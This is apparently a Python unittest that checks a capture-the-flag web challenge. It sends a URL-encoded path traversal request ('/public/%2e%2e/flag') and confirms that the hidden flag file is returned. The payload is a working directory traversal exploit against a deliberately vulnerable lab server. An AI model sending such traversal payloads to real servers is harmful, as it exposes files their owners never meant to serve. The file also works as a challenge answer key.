import unittest
import urllib.request
import os
import yaml


class Sauerkraut(unittest.TestCase):
    with open(os.path.join(os.path.dirname(__file__), "challenge.yml"), "r") as f:
        CHALLENGE_URL = yaml.safe_load(f)["extra"]["connection_info"]
    with open(os.path.join(os.path.dirname(__file__), "flag"), "r") as f:
        SNYK_FLAG = yaml.safe_load(f)

    def test_dt_url(self):
        url = self.CHALLENGE_URL+"/public/%2e%2e/flag"
        with urllib.request.urlopen(url) as res:
            self.assertIn(self.SNYK_FLAG, str(res.read()))

if __name__ == "__main__":
    unittest.main()
